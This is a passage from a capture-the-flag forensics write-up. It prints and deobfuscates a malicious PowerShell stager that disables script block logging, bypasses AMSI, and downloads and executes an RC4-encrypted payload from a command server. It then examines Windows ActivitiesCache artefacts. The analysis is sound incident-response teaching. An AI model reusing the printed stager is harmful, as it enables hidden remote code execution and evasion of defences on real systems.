variable">$R</span>=<span class="token punctuation">{</span><span class="token variable">$D</span><span class="token punctuation">,</span><span class="token variable">$K</span>=<span class="token variable">$ARgs</span><span class="token punctuation">;</span><span class="token variable">$S</span>=0<span class="token punctuation">.</span><span class="token punctuation">.</span>255<span class="token punctuation">;</span>0<span class="token punctuation">.</span><span class="token punctuation">.</span>255<span class="token punctuation">|</span><span class="token operator">%</span><span class="token punctuation">{</span><span class="token variable">$J</span>=<span class="token punctuation">(</span><span class="token variable">$J</span><span class="token operator">+</span><span class="token variable">$S</span><span class="token punctuation">[</span><span class="token variable">$_</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token variable">$K</span><span class="token punctuation">[</span><span class="token variable">$_</span><span class="token operator">%</span><span class="token variable">$K</span><span class="token punctuation">.</span>COUnt<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span>256<span class="token punctuation">;</span><span class="token variable">$S</span><span class="token punctuation">[</span><span class="token variable">$_</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$S</span><span class="token punctuation">[</span><span class="token variable">$J</span><span class="token punctuation">]</span>=<span class="token variable">$S</span><span class="token punctuation">[</span><span class="token variable">$J</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$S</span><span class="token punctuation">[</span><span class="token variable">$_</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token variable">$D</span><span class="token punctuation">|</span><span class="token operator">%</span><span class="token punctuation">{</span><span class="token variable">$I</span>=<span class="token punctuation">(</span><span class="token variable">$I</span><span class="token operator">+</span>1<span class="token punctuation">)</span><span class="token operator">%</span>256<span class="token punctuation">;</span><span class="token variable">$H</span>=<span class="token punctuation">(</span><span class="token variable">$H</span><span class="token operator">+</span><span class="token variable">$S</span><span class="token punctuation">[</span><span class="token variable">$I</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span>256<span class="token punctuation">;</span><span class="token variable">$S</span><span class="token punctuation">[</span><span class="token variable">$I</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$S</span><span class="token punctuation">[</span><span class="token variable">$H</span><span class="token punctuation">]</span>=<span class="token variable">$S</span><span class="token punctuation">[</span><span class="token variable">$H</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$S</span><span class="token punctuation">[</span><span class="token variable">$I</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">-bXoR</span><span class="token variable">$S</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token variable">$S</span><span class="token punctuation">[</span><span class="token variable">$I</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token variable">$S</span><span class="token punctuation">[</span><span class="token variable">$H</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span>256<span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token variable">$B3904</span><span class="token punctuation">.</span>HEADErs<span class="token punctuation">.</span>ADD<span class="token punctuation">(</span><span class="token string">"Cookie"</span><span class="token punctuation">,</span><span class="token string">"lvzoFoofzAIvDVtv=kwVHnweXSgzIzxxP+6gO0Di09Jg="</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$dAta</span>=<span class="token variable">$B3904</span><span class="token punctuation">.</span>DowNLOAdDaTA<span class="token punctuation">(</span><span class="token variable">$SER</span><span class="token operator">+</span><span class="token variable">$T</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$IV</span>=<span class="token variable">$Data</span><span class="token punctuation">[</span>0<span class="token punctuation">.</span><span class="token punctuation">.</span>3<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$daTA</span>=<span class="token variable">$daTA</span><span class="token punctuation">[</span>4<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token variable">$daTA</span><span class="token punctuation">.</span>lengTh<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token operator">-JoIn</span><span class="token namespace">[CHAr[]]</span><span class="token punctuation">(</span>&amp; <span class="token variable">$R</span> <span class="token variable">$DatA</span> <span class="token punctuation">(</span><span class="token variable">$IV</span><span class="token operator">+</span><span class="token variable">$K</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">|</span><span class="token function">IEX</span></span></span></span></code></pre><div id="https://www.notion.so/9fe3888ecf8549d7942e115ae0231fe3" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">We see a chunk of obfuscated PowerShell code, which is another sign that this is doing something malicious. Let‚Äôs break this down further to understand what it is doing:</span></span></p></div><pre id="https://www.notion.so/55c1b6c4a4c64938a0213699b7c4f7db" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token keyword">IF</span> <span class="token punctuation">(</span><span class="token variable">$PSVErSiONTaBLe</span><span class="token punctuation">.</span>PSVErsIOn<span class="token punctuation">.</span>MajOr <span class="token operator">-ge</span> 3<span class="token punctuation">)</span> <span class="token punctuation">{</span>
	<span class="token variable">$f0C32</span> = <span class="token namespace">[ReF]</span><span class="token punctuation">.</span>ASSemblY<span class="token punctuation">.</span>GetTYpe<span class="token punctuation">(</span><span class="token string">'System.Management.Automation.Utils'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"GETFiE`ld"</span><span class="token punctuation">(</span><span class="token string">'cachedGroupPolicySettings'</span><span class="token punctuation">,</span> <span class="token string">'N'</span><span class="token operator">+</span><span class="token string">'onPublic,Static'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">IF</span> <span class="token punctuation">(</span><span class="token variable">$F0c32</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token variable">$ea761</span> = <span class="token variable">$F0c32</span><span class="token punctuation">.</span>GEtVAlue<span class="token punctuation">(</span><span class="token variable">$NuLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">If</span> <span class="token punctuation">(</span><span class="token variable">$ea761</span><span class="token punctuation">[</span><span class="token string">'ScriptB'</span><span class="token operator">+</span><span class="token string">'lockLogging'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
			<span class="token variable">$eA761</span><span class="token punctuation">[</span><span class="token string">'ScriptB'</span><span class="token operator">+</span><span class="token string">'lockLogging'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'EnableScriptB'</span><span class="token operator">+</span><span class="token string">'lockLogging'</span><span class="token punctuation">]</span> = 0<span class="token punctuation">;</span>
			<span class="token variable">$ea761</span><span class="token punctuation">[</span><span class="token string">'ScriptB'</span><span class="token operator">+</span><span class="token string">'lockLogging'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'EnableScriptBlockInvocationLogging'</span><span class="token punctuation">]</span> = 0
		<span class="token punctuation">}</span>
		<span class="token variable">$Val</span> = <span class="token namespace">[COllEctIoNs.GeNerIC.DICtIonaRY[StRiNg,SysTEM.OBJEct]]</span>::NEw<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token variable">$VAL</span><span class="token punctuation">.</span>ADD<span class="token punctuation">(</span><span class="token string">'EnableScriptB'</span><span class="token operator">+</span><span class="token string">'lockLogging'</span><span class="token punctuation">,</span> 0<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token variable">$VaL</span><span class="token punctuation">.</span>ADD<span class="token punctuation">(</span><span class="token string">'EnableScriptBlockInvocationLogging'</span><span class="token punctuation">,</span> 0<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token variable">$Ea761</span><span class="token punctuation">[</span><span class="token string">'HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'</span><span class="token operator">+</span><span class="token string">'lockLogging'</span><span class="token punctuation">]</span> = <span class="token variable">$val</span>
	<span class="token punctuation">}</span>	<span class="token keyword">ElSe</span> <span class="token punctuation">{</span>
		<span class="token namespace">[ScRIpTBlOck]</span><span class="token punctuation">.</span><span class="token string">"GETFie`ld"</span><span class="token punctuation">(</span><span class="token string">'signatures'</span><span class="token punctuation">,</span> <span class="token string">'N'</span><span class="token operator">+</span><span class="token string">'onPublic,Static'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>SetVAlUe<span class="token punctuation">(</span><span class="token variable">$null</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token function">NEW-OBjECt</span> CoLLEctIONs<span class="token punctuation">.</span>GEnERic<span class="token punctuation">.</span>HAsHSeT<span class="token namespace">[stRinG]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
	<span class="token punctuation">}</span>
	<span class="token variable">$REf</span>=<span class="token namespace">[REf]</span><span class="token punctuation">.</span>AsSEmbLy<span class="token punctuation">.</span>GEtTYPe<span class="token punctuation">(</span><span class="token string">'System.Management.Automation.Amsi'</span><span class="token operator">+</span><span class="token string">'Utils'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$REf</span><span class="token punctuation">.</span>GeTFIeLd<span class="token punctuation">(</span><span class="token string">'amsiInitF'</span><span class="token operator">+</span><span class="token string">'ailed'</span><span class="token punctuation">,</span> <span class="token string">'NonPublic,Static'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>SEtValUE<span class="token punctuation">(</span><span class="token variable">$NuLL</span><span class="token punctuation">,</span><span class="token boolean">$trUE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token namespace">[SystEm.Net.SErvICEPointMANagER]</span>::ExpECt100COntiNUE = 0<span class="token punctuation">;</span>
<span class="token variable">$b3904</span> = <span class="token function">NEw-OBJECt</span> SYstem<span class="token punctuation">.</span>NeT<span class="token punctuation">.</span>WebCLIeNT<span class="token punctuation">;</span>
<span class="token variable">$u</span> = <span class="token string">'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko'</span><span class="token punctuation">;</span>
<span class="token variable">$ser</span> = $<span class="token punctuation">(</span><span class="token namespace">[TeXT.EnCODing]</span>::UNICOdE<span class="token punctuation">.</span>GeTSTrINg<span class="token punctuation">(</span><span class="token namespace">[ConVERT]</span>::FRomBAsE64StRiNg<span class="token punctuation">(</span><span class="token string">'aAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMAAuADIANwA6ADcANwA3ADcA'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$t</span> = <span class="token string">'/admin/get.php'</span><span class="token punctuation">;</span>
<span class="token variable">$b3904</span><span class="token punctuation">.</span>HeAdeRs<span class="token punctuation">.</span>AdD<span class="token punctuation">(</span><span class="token string">'User-Agent'</span><span class="token punctuation">,</span> <span class="token variable">$u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$b3904</span><span class="token punctuation">.</span>PRoXy = <span class="token namespace">[SysTEm.NeT.WEbREqUest]</span>::DEFaultWEBPrOXy<span class="token punctuation">;</span>
<span class="token variable">$b3904</span><span class="token punctuation">.</span>PRoXy<span class="token punctuation">.</span>CREdenTials = <span class="token namespace">[SYstem.NeT.CREdENtIaLCaChE]</span>::DEFAultNetWOrKCredEnTiAlS<span class="token punctuation">;</span>
<span class="token variable">$Script</span>:Proxy = <span class="token variable">$b3904</span><span class="token punctuation">.</span>Proxy<span class="token punctuation">;</span>
<span class="token variable">$K</span> = <span class="token namespace">[SYSteM.TexT.EnCODINg]</span>::ASCII<span class="token punctuation">.</span>GeTByTes<span class="token punctuation">(</span><span class="token string">'/Y0dzf;_)NkL^~M#K(xG]*rOFe,C}2%R'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$R</span> = <span class="token punctuation">{</span>
	<span class="token variable">$D</span><span class="token punctuation">,</span> <span class="token variable">$K</span> = <span class="token variable">$ARgs</span><span class="token punctuation">;</span>
	<span class="token variable">$S</span> = 0<span class="token punctuation">.</span><span class="token punctuation">.</span>255<span class="token punctuation">;</span>
	0<span class="token punctuation">.</span><span class="token punctuation">.</span>255 <span class="token punctuation">|</span> <span class="token operator">%</span> <span class="token punctuation">{</span>
		<span class="token variable">$J</span> = <span class="token punctuation">(</span><span class="token variable">$J</span> <span class="token operator">+</span> <span class="token variable">$S</span><span class="token punctuation">[</span><span class="token variable">$_</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token variable">$K</span><span class="token punctuation">[</span><span class="token variable">$_</span><span class="token operator">%</span><span class="token variable">$K</span><span class="token punctuation">.</span>COUnt<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> 256<span class="token punctuation">;</span>
		<span class="token variable">$S</span><span class="token punctuation">[</span><span class="token variable">$_</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$S</span><span class="token punctuation">[</span><span class="token variable">$J</span><span class="token punctuation">]</span> = <span class="token variable">$S</span><span class="token punctuation">[</span><span class="token variable">$J</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$S</span><span class="token punctuation">[</span><span class="token variable">$_</span><span class="token punctuation">]</span>
	<span class="token punctuation">}</span><span class="token punctuation">;</span>
	<span class="token variable">$D</span> <span class="token punctuation">|</span> <span class="token operator">%</span> <span class="token punctuation">{</span>
		<span class="token variable">$I</span> = <span class="token punctuation">(</span><span class="token variable">$I</span><span class="token operator">+</span>1<span class="token punctuation">)</span> <span class="token operator">%</span> 256<span class="token punctuation">;</span>
		<span class="token variable">$H</span> = <span class="token punctuation">(</span><span class="token variable">$H</span><span class="token operator">+</span><span class="token variable">$S</span><span class="token punctuation">[</span><span class="token variable">$I</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> 256<span class="token punctuation">;</span>
		<span class="token variable">$S</span><span class="token punctuation">[</span><span class="token variable">$I</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$S</span><span class="token punctuation">[</span><span class="token variable">$H</span><span class="token punctuation">]</span> = <span class="token variable">$S</span><span class="token punctuation">[</span><span class="token variable">$H</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$S</span><span class="token punctuation">[</span><span class="token variable">$I</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token variable">$_</span><span class="token operator">-bXoR</span><span class="token variable">$S</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token variable">$S</span><span class="token punctuation">[</span><span class="token variable">$I</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token variable">$S</span><span class="token punctuation">[</span><span class="token variable">$H</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> 256<span class="token punctuation">]</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token variable">$B3904</span><span class="token punctuation">.</span>HEADErs<span class="token punctuation">.</span>ADD<span class="token punctuation">(</span><span class="token string">"Cookie"</span><span class="token punctuation">,</span><span class="token string">"lvzoFoofzAIvDVtv=kwVHnweXSgzIzxxP+6gO0Di09Jg="</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$dAta</span> = <span class="token variable">$B3904</span><span class="token punctuation">.</span>DowNLOAdDaTA<span class="token punctuation">(</span><span class="token variable">$SER</span><span class="token operator">+</span><span class="token variable">$T</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$IV</span> = <span class="token variable">$Data</span><span class="token punctuation">[</span>0<span class="token punctuation">.</span><span class="token punctuation">.</span>3<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$daTA</span> = <span class="token variable">$daTA</span><span class="token punctuation">[</span>4<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token variable">$daTA</span><span class="token punctuation">.</span>lengTh<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token operator">-JoIn</span><span class="token namespace">[CHAr[]]</span><span class="token punctuation">(</span>&amp; <span class="token variable">$R</span> <span class="token variable">$DatA</span> <span class="token punctuation">(</span><span class="token variable">$IV</span><span class="token operator">+</span><span class="token variable">$K</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">IEX</span></span></span></span></code></pre><div id="https://www.notion.so/6fa4f471644a4182a26ce860c1ca4a62" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The script seems to be collecting credentials, and making a call back to some attacker server. The aptly-named the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ser</code></span><span class="SemanticString"> variable may offer some hints as to where that call leads:</span></span></p></div><pre id="https://www.notion.so/d2d741d9d8cf46a39137ff942bb2d4f8" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token variable">$ser</span> = $<span class="token punctuation">(</span><span class="token namespace">[TeXT.EnCODing]</span>::UNICOdE<span class="token punctuation">.</span>GeTSTrINg<span class="token punctuation">(</span><span class="token namespace">[ConVERT]</span>::FRomBAsE64StRiNg<span class="token punctuation">(</span><span class="token string">'aAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMAAuADIANwA6ADcANwA3ADcA'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span></span></code></pre><div id="https://www.notion.so/6011336db7fc41fdbcdc723bcd559d2c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Decoding the Base64 variable gives:</span></span></p></div><div id="https://www.notion.so/98d6fc3046d8434f95c8b261afec5c79" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ echo &quot;aAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMAAuADIANwA6ADcANwA3ADcA&quot; | base64 -d</code></span></span></p></div><pre id="https://www.notion.so/7ede999def754978a8902bd8fca16d20" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>http://192.168.0.27:7777</span></span></span></code></pre><div id="https://www.notion.so/4f22e5e974ef430481305b7db84eaf20" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">And we have the server address!</span></span></p></div><div id="https://www.notion.so/71d6bf4076cf4a459ee85d3428b85f60" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Flag 1: </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">DUCTF{12:38_192.168.0.27}</code></span></span></p></div><h3 id="https://www.notion.so/58f1bba8c6c74dab84277394a2c63d2d" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/58f1bba8c6c74dab84277394a2c63d2d"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Examining the ActivitiesCache database</span></span></h3><div id="https://www.notion.so/bad407415006499aac7adc83769703d8" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">For the next flag, we are required to locate a </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">passwd.txt</code></span><span class="SemanticString"> file, then find out when it was first opened by the Challenger user, and recover the contents of the file. Unfortunately, this file has either been deleted or was not included in the image dump we were given, so it is not going to be as straightforward as it sounds. Thankfully, Windows has tons of forensic artefacts which we can use to recover information about this file, and possibly contents of the file as well.</span></span></p></div><div id="https://www.notion.so/6d1c6e2dcf9943d1a12b60257799ffe6" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">To find out when the file was first opened, I figured that we can use the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">ActivitiesCache</code></span><span class="SemanticString"> database or Windows Timeline, it is part of the Connected Devices Platform Service (CDPSvc) and was first introduced in Windows 10 with version 1803. This database is located in the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">%USERPROFILE%\AppData\Local\ConnectedDevicesPlatform\L.Username</code></span><span class="SemanticString"> folder, and contains details about a user‚Äôs past activities, what program had been executed, their associated payload (including what file was opened), their starting/ending timestamps along with the duration of the activity, and more. It is a gold mine for digital forensic investigators when trying to find out what a user had been doing on their device.</span></span></p></div><div id="https://www.notion.so/48a232f73e794980987f93afbd8d7190" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Navigating to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">\Users\Challenger\AppData\Local\ConnectedDevicesPlatform\L.Challenger</code></span><span class="SemanticString">, we see the following files:</span></span></p></div><div id="https://www.notion.so/2bdfd26bcd7743099ad53e319f5563ed" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ cd Users/Challenger/AppData/Local/ConnectedDevicesPlatform/L.Challenger</code></span></span></p></div><div id="https://www.notion.so/4bc569198796470fb495c7d763fc9f5a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ ls -la</code></span></span></p></div><pre id="https://www.notion.so/839f21a33a59468bb4b7279daf94b212" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>total 3120
drwxr-xr-x 2 kali kali    4096 Oct  8 18:46  .
drwxr-xr-x 3 kali kali    4096 Sep 25 13:49  ..
-rwxr--r-- 1 kali kali    4096 Oct  8 18:46 &#x27;$I30&#x27;
-rwxr--r-- 1 kali kali 1048576 Oct  8 18:46  ActivitiesCache.db
-rwxr--r-- 1 kali kali   32768 Oct  8 18:46  ActivitiesCache.db-shm
-rwxr--r-- 1 kali kali 2039432 Oct  8 18:46  ActivitiesCache.db-wal
-rwxr--r-- 1 kali kali   57720 Oct  8 18:46  ActivitiesCache.db-wal.FileSlack</span></span></span></code></pre><div id="https://www.notion.so/0897bbbc9a704b13a512220e9ab63a94" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Upon searching about the file extensions, we learn that the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">.db-wal</code></span><span class="SemanticString"> is the write-ahead log file and </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">.db-shm</code></span><span class="SemanticString"> is the shared-memory file used by SQLite3. The write-ahead log acts a roll-forward journal that records transactions which have been committed but not yet applied to the main database, while the shared-memory file acts as a cache that allows the database to quickly locate frames within the write-ahead log.</span></span></p></div><div id="https://www.notion.so/e148c8b053904c54b1dba9ed369cd3c8" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">What this means for us is that the write-ahead log can contain entries which don‚Äôt exist in the main </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">ActivitiesCache.db</code></span><span class="SemanticString"> database yet. So, in order to have the complete picture, we‚Äôll merge these entries first before extracting from the database. To do this, we will use SQLite‚Äôs VACUUM command:</span></span></p></div><div id="https://www.notion.so/3e5fbc66db8e4a9780017a198c83c881" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ sqlite3 ActivitiesCache.db</code></span></span></p></div><div id="https://www.notion.so/771dcd3b6d4c4c89af27f7b298b76a0b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">sqlite&gt; VACUUM;</code></span></span></p></div><div id="https://www.notion.so/41ffe75ece784a40bf9f5534ad8acbe9" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">And we will exit the console by pressing Ctrl-D.</span></span></p></div><div id="https://www.notion.so/8944ba6440944b60b8d42cb9f0cc6c92" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">With the database merged, we can now focus on extracting the entries. This can be done manually by selecting all of the entries in the Activities table, then dig through each entry and converting the relevant timestamp.</span></span></p></div><div id="https://www.notion.so/898f07f8dd484129a0dd5e4d97364afb" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ sqlite3 ActivitiesCache.db</code></span></span></p></div><div id="https://www.notion.so/2ac766b8e8be407d861588fd1a4597bc" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">sqlite&gt; SELECT * FROM Activities;</code></span></span></p></div><div id="https://www.notion.so/a1d100e4c3234e1b9240cf4101afa25e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Alternatively, we can make life simpler and just use a tool specifically built for extracting these entries. Eric Zimmerman&#x27;s Windows 10 Timeline database parser (</span><span class="SemanticString"><span class="SemanticString__Fragment SemanticString__Fragment--Unknown">‚Ä£</span></span><span class="SemanticString">) does exactly what we want here. After downloading the tool, we can extract the entries into a CSV file as so:</span></span></p></div><div id="https://www.notion.so/3274f26689964a2788c43d8d6408d922" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">&gt; .\WxTCmd.exe -f .\ActivitiesCache.db --csv .\export</code></span></span></p></div><pre id="https://www.notion.so/bad9e9b64e88496bab3ecc5fc1ef4354" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>WxTCmd version 1.0.0.0

Author: Eric Zimmerman (saericzimmerman@gmail.com)
https://github.com/EricZimmerman/WxTCmd

Command line: -f .\ActivitiesCache.db --csv .\export

Warning: Administrator privileges not found!

ActivityOperation entries found: 0
Activity_PackageId entries found: 97
Activity entries found: 33

Results saved to: .\export

Processing complete in 0.4967 seconds

Unable to delete SQLite.Interop.dll. Delete manually if needed</span></span></span></code></pre><div id="https://www.notion.so/5f9f61df84534eda88745189127115d8" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">After extracting, we spot one entry mentioning the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">passwd.txt</code></span><span class="SemanticString"> file:</span></span></p></div><pre id="https://www.notion.so/6fceb4e8263f4e80970e21311ccef45e" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token key atrule">ID</span><span class="token punctuation">:</span> 527023dd<span class="token punctuation">-</span>5fac<span class="token punctuation">-</span>e637<span class="token punctuation">-</span>8772<span class="token punctuation">-</span>6b5077e95acf
<span class="token key atrule">ActivityTypeOrg</span><span class="token punctuation">:</span> <span class="token number">5</span>
<span class="token key atrule">ActivityType</span><span class="token punctuation">:</span> ExecuteOpen
<span class="token key atrule">Executable</span><span class="token punctuation">:</span> System32\notepad.exe
<span class="token key atrule">DisplayText</span><span class="token punctuation">:</span> passwd.txt (Notepad)
<span class="token key atrule">ContentInfo</span><span class="token punctuation">:</span> <span class="token key atrule">C:\Users\Challenger\Desktop\passwd.txt (file:Unmapped GUID</span><span class="token punctuation">:</span> //C<span class="token punctuation">:</span>/Users/Challenger/Desktop/passwdtxt<span class="token punctuation">?</span>VolumeId=<span class="token punctuation">{</span>21D4431B<span class="token punctuation">-</span>0000<span class="token punctuation">-</span>0000<span class="token punctuation">-</span>0000<span class="token punctuation">-</span><span class="token number">300300000000</span><span class="token punctuation">}</span><span class="token important">&amp;ObjectId=</span><span class="token punctuation">{</span>119740AE<span class="token punctuation">-</span>8233<span class="token punctuation">-</span>11EB<span class="token punctuation">-</span>9779<span class="token punctuation">-</span>0800272ADCE0<span class="token punctuation">}</span><span class="token important">&amp;KnownFolderId=ThisPCDesktopFolder&amp;KnownFolderLength=27)</span>
